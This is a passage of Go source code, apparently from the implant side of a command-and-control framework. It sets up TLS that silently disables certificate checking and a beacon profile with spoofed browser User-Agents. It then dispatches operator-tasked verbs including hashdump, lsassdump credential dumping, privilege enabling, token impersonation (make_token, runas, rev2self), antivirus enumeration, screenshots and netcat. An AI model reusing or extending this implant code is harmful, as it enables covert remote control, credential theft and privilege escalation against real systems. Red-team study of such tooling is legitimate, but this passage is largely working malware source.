					"verification against embedded CA\n")
			} else {
				diag("[tls] RootCAPem could not be added to pool "+
					"— falling back to InsecureSkipVerify\n")
				out.InsecureSkipVerify = true
			}
		} else {
			diag("[tls] RootCAPem b64 decode failed: %v\n", err)
			out.InsecureSkipVerify = true
		}
	} else {
		diag("[tls] no RootCAPem — InsecureSkipVerify enabled\n")
		out.InsecureSkipVerify = true
	}

	if cfg.ClientCertPem != "" && cfg.ClientKeyPem != "" {
		certRaw, err1 := base64.StdEncoding.DecodeString(cfg.ClientCertPem)
		keyRaw, err2 := base64.StdEncoding.DecodeString(cfg.ClientKeyPem)
		if err1 == nil && err2 == nil {
			cert, err := tls.X509KeyPair(certRaw, keyRaw)
			if err != nil {
				return nil, err
			}
			out.Certificates = []tls.Certificate{cert}
			diag("[tls] mTLS client certificate loaded\n")
		} else {
			diag("[tls] mTLS cert or key decode failed "+
				"cert_err=%v key_err=%v\n", err1, err2)
		}
	}

	return out, nil
}

func (a *Agent) buildTLSConfig() (*tls.Config, error) {
	return BuildTLSConfig(a.cfg)
}

func defaultProfile() protocol.Profile {
	var ua string
	switch runtime.GOOS {
	case "linux":
		ua = "Mozilla/5.0 (X11; Linux x86_64)"
	case "darwin":
		ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
	default:
		ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
	}
	return protocol.Profile{
		UserAgent:    ua,
		BeaconPath:   "/beacon",
		TasksPath:    "/tasks",
		ResultsPath:  "/results",
		ExtraHeaders: map[string]string{},
	}
}

var nativeExtraVerbs = map[string]bool{
	"find": true, "grep": true, "head": true, "tail": true,
	"stat": true, "strings": true, "hexdump": true,
	"sha1": true, "sha256": true, "md5": true,
	"readlink": true, "realpath": true, "du": true,
	"mkdir": true, "rm": true, "cp": true, "mv": true,
	"chmod": true, "ln": true, "touch": true,
	"wc": true, "nl": true, "rev": true, "sort": true,
	"uniq": true, "tr": true, "cksum": true,
	"base64": true, "gzip": true, "gunzip": true,
	"which": true, "ifconfig": true,
	"curl": true, "resolve": true, "nc": true,
	"df": true, "uptime": true, "date": true,
	"getpid": true, "getppid": true,
	"screenshot": true,
	"netstat": true, "arp": true, "route": true,
	"users": true, "groups": true,
	"av-list": true,
	"hashdump": true,
	"enablepriv": true,
	"lsassdump": true,
	"make_token": true,
	"runas":      true,
	"rev2self":   true,
}

func isNativeExtraVerb(verb string) bool {
	return nativeExtraVerbs[verb]
}

func (a *Agent) nativeExtraVerb(t protocol.Task) protocol.Result {
	switch t.Verb {
	case "find":     return NativeFind(t)
	case "grep":     return NativeGrep(t)
	case "head":     return NativeHead(t)
	case "tail":     return NativeTail(t)
	case "stat":     return NativeStat(t)
	case "strings":  return NativeStrings(t)
	case "hexdump":  return NativeHexdump(t)
	case "sha1":     return NativeHash(t, "sha1")
	case "sha256":   return NativeHash(t, "sha256")
	case "md5":      return NativeHash(t, "md5")
	case "ln":       return NativeLn(t)
	case "touch":    return NativeTouch(t)
	case "wc":       return NativeWc(t)
	case "nl":       return NativeNl(t)
	case "rev":      return NativeRev(t)
	case "sort":     return NativeSort(t)
	case "uniq":     return NativeUniq(t)
	case "tr":       return NativeTr(t)
	case "cksum":    return NativeCksum(t)
	case "base64":   return NativeBase64(t)
	case "gzip":     return NativeGzip(t, true)
	case "gunzip":   return NativeGzip(t, false)
	case "which":    return NativeWhich(t)
	case "ifconfig": return NativeIfconfig(t)
	case "readlink": return NativeReadlink(t)
	case "realpath": return NativeRealpath(t)
	case "du":       return NativeDu(t)
	case "mkdir":    return NativeMkdir(t)
	case "rm":       return NativeRm(t)
	case "cp":       return NativeCp(t)
	case "mv":       return NativeMv(t)
	case "chmod":    return NativeChmod(t)
	case "date":
		now := time.Now()
		out := fmt.Sprintf("local: %s\nutc:   %s\n",
			now.Format("2006-01-02 15:04:05 MST -0700"),
			now.UTC().Format("2006-01-02 15:04:05 UTC -0700"))
		return a.simpleVerb(t, []byte(out))
	case "getpid":
		return a.simpleVerb(t,
			[]byte(strconv.Itoa(os.Getpid())+"\n"))
	case "getppid":
		return a.simpleVerb(t,
			[]byte(strconv.Itoa(os.Getppid())+"\n"))
	case "uptime":
		out, err := native.NativeUptime()
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "df":
		out, err := native.NativeDF(t.Args)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "netstat":
		out, err := native.NativeNetstat(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "arp":
		out, err := native.NativeArp(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "route":
		out, err := native.NativeRoute(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "users":
		out, err := native.NativeUsers(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "groups":
		out, err := native.NativeGroups(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "av-list":
		out, err := native.NativeAvList(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "hashdump":
		out, err := native.NativeHashdump(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "enablepriv":
		out, err := native.NativeEnablePriv(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "lsassdump":
		out, err := native.NativeLsassDump(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "make_token":
		out, err := native.NativeMakeToken(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "runas":
		out, err := native.NativeRunas(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "rev2self":
		out, err := native.NativeRev2Self(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "curl":    return NativeCurl(t)
	case "resolve": return NativeResolve(t)
	case "nc":         return NativeNc(t)
	case "screenshot":
		out, err := native.NativeScreenshot(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID,
			Output: encodeOutput([]byte(out))}
	}
	return protocol.Result{ID: t.ID, Error: "unknown native verb: " + t.Verb}
}